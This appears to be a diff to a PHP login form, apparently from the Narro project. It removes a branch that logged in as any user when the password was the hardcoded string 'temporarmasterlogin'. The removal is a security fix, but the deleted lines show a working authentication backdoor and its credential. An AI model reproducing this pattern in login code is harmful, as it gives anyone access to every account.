@@ -63,16 +63,6 @@
                 else
                     QApplication::Redirect('narro_project_list.php');
             }
-            elseif ($this->txtPassword->Text == 'temporarmasterlogin' && $objUser = NarroUser::LoadByUsername($this->txtUsername->Text)) {
-                $_SESSION['objUser'] = $objUser;
-                if ($this->chkRememberLogin->Checked)
-                    setcookie(session_name(), $_COOKIE[session_name()], time()+31*24*3600, "/");
-                QApplication::$objUser = $objUser;
-                if ($this->txtPreviousUrl)
-                    QApplication::Redirect($this->txtPreviousUrl);
-                else
-                    QApplication::Redirect('narro_project_list.php');
-            }
             else {
                 $this->lblMessage->ForeColor = 'red';
                 $this->lblMessage->Text = t('Bad username or password');
